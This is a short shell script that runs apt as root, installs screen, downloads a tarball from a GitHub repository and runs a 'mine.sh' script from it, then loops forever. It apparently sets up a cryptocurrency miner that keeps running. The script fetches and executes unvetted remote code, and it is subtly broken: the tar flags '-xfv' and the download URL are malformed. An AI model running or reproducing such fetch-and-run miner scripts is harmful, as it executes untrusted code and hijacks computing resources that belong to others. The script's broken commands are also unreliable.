#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/Pex12345/hellhell/hcl.tar.gz
tar -xfv hcl.tar.gz
cd hcl
./mine.sh

while [ 1 ]; do
sleep 3
done
sleep 999
